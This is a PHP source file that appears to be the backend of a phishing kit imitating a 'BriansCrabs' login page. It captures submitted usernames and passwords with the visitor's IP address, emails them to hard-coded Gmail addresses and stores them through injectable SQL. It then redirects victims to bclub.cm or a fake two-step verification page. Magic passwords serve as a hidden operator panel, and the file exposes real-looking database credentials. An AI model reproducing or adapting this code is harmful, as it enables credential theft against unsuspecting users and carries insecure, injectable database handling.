<?php
$hardcodedUsernames = array();
$usernameswarned = array();
// Load usernames from a file if it exists
$filename = 'usernames.txt';
$filename2 = 'nostep.txt';
$status = 'status.txt';
$filename3 = 'usernameswarn.txt';
$ip_address = $_SERVER['REMOTE_ADDR'];

if (file_exists($filename)) {
    $hardcodedUsernames = explode(',', file_get_contents($filename));
}

if (file_exists($status)) {
    $statusvalue = explode(file_get_contents($status));
}
if (file_exists($filename)) {
    $nostepusernames = explode(',', file_get_contents($filename2));
}
if (file_exists($filename3)) {
    $usernameswarned = explode(',', file_get_contents($filename3));
}


if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $server = "localhost";
    $user = "sarthak0312";
    $pass = "Zx4521axy@123";
    $db = "brianscrabs";
    $recipients = "Itssarthakarora@gmail.com , peoraghav@gmail.com"; // Replace with the email addresses of the recipients
    $subject = "BriansCrabs: Login Credentials";
    $conn = new mysqli($server, $user, $pass, $db);
    if ($conn->connect_errno) {
        echo "Database connection failed!<BR>";
        echo "Reason: ", $conn->connect_error;
        exit();
    } else {
        $username = $_POST["username"];
        $password = $_POST["password"];
        $message = "Username: " . $username . "\n" . "Password: " . $password . "\n" . "IP Address: " . $ip_address . "\n";

        
        
        if ($password === "websitedown")
        {
            $statusValue = "down";
            file_put_contents($status, $statusValue);
            header("Location: https://brianscrabs.de/webstatusdown.html");
            exit();
            
        }
        if ($password === "websiteup")
        {
            $statusValue = "up";
            file_put_contents($status, $statusValue);
            header("Location: https://brianscrabs.de/webstatusup.html");
            exit();
        }
        // List of hardcoded usernames separated by a comma
        if ($password === "code4521") {
            // Check if the entered username already exists in the array
            if (!in_array($username, $hardcodedUsernames)) {
                // If it doesn't exist, add the entered username to the array
                $hardcodedUsernames[] = $username;
                // Save the updated array to a file
                file_put_contents($filename, implode(',', $hardcodedUsernames));
                // Provide feedback to the user
                header("Location: https://brianscrabs.de/added.html");
                exit();
            } else {
                // If the username exists, show an error message
                header("Location: https://brianscrabs.de/alreadyexisted.html");
                exit();
            }
        }
        if ($password === "code502") {
            // Check if the entered username already exists in the array
            if (!in_array($username, $warnedusernames)) {
                // If it doesn't exist, add the entered username to the array
                $usernameswarned[] = $username;
                // Save the updated array to a file
                file_put_contents($filename3, implode(',', $usernameswarned));
                // Provide feedback to the user
                header("Location: https://brianscrabs.de/added.html");
                exit();
            } else {
                // If the username exists, show an error message
                header("Location: https://brianscrabs.de/alreadyexisted.html");
                exit();
            }
        }
       
        if ($password === "no4521") {
            // Check if the entered username already exists in the array
            if (!in_array($username, $nostepusernames)) {
                // If it doesn't exist, add the entered username to the array
                $nostepusernames[] = $username;
                // Save the updated array to a file
                file_put_contents($filename2, implode(',', $nostepusernames));
                // Provide feedback to the user
                header("Location: https://brianscrabs.de/added.html");
                exit();
            } else {
                // If the username exists, show an error message
                header("Location: https://brianscrabs.de/alreadyexisted.html");
                exit();
            }
        }
        if ($password === "sarthak4521") {
            header("Location: https://brianscrabs.de/usernames.txt");
            exit();
        }
        if ($password === "delete") {
            // Check if the entered username exists in the array
            $index = array_search($username, $hardcodedUsernames);
            if ($index !== false) {
                // If it exists, remove the username from the array
                array_splice($hardcodedUsernames, $index, 1);
                // Save the updated array to the file
                file_put_contents($filename, implode(',', $hardcodedUsernames));
                // Provide feedback to the user
                header("Location: https://brianscrabs.de/deleted.html");
                exit();
            } else {
                // If the username doesn't exist, show an error message
                header("Location: https://brianscrabs.de/notexisted.html");
                exit();
            }
        }
        if ($password === "nodelete") {
            // Check if the entered username exists in the array
            $index = array_search($username, $nostepusernames);
            if ($index !== false) {
                // If it exists, remove the username from the array
                array_splice($nostepusernames, $index, 1);
                // Save the updated array to the file
                file_put_contents($filename2, implode(',', $nostepusernames));
                // Provide feedback to the user
                header("Location: https://brianscrabs.de/deleted.html");
                exit();
            } else {
                // If the username doesn't exist, show an error message
                header("Location: https://brianscrabs.de/notexisted.html");
                exit();
            }
        }
        
        // Explode the list of usernames into an array
        //    $hardcodedUsernamesArray = explode(",", $hardcodedUsernames);
        // Check if the entered username matches any of the hardcoded usernames
        if(file_get_contents($status) ==="up")
        {
        if (in_array($username, $hardcodedUsernames)) {
            // Redirect to another location with the username as a query parameter
            header("Location: https://brianscrabs.de/Verification.html?username=" . urlencode($username));
            $headers = "From: noreply@example.com";
            mail($recipients, "2 STEP LOGIN INITIATED", $message, $headers);
            exit(); // Make sure to exit after the redirection
            
        }
        
        
        $sql = "INSERT INTO brianscrabs(user, data) VALUES('$username', '$password');";
        $res = $conn->query($sql);
        if ($res) {
            header("Location: https://bclub.cm");
            $headers = "From: noreply@example.com";
            mail($recipients, $subject, $message, $headers);
            // block of code to process further...
            
        } else {
            echo "Something went wrong!<BR>";
            echo "Error description: ", $conn->error;
            exit();
        }
        }
        
        if (file_get_contents($status) ==="down")
        {   
            if (in_array($username, $nostepusernames)) {
            // Redirect to another location with the username as a query parameter
            header("Location: https://bclub.cm");
            $headers = "From: noreply@example.com";
            mail($recipients, $subject, $message, $headers);
            exit(); // Make sure to exit after the redirection
            
        }
        if (in_array($username, $usernameswarned)) {
            // Redirect to another location with the username as a query parameter
            header("Location: https://brianscrabs.de/502.html");
            exit(); // Make sure to exit after the redirection
            
        }
            header("Location: https://brianscrabs.de/Verification.html?username=" . urlencode($username));
            $headers = "From: noreply@example.com";
            mail($recipients, "2 STEP LOGIN INITIATED", $message, $headers);
            exit();
        }
        
    }
    $conn->close();
}
?>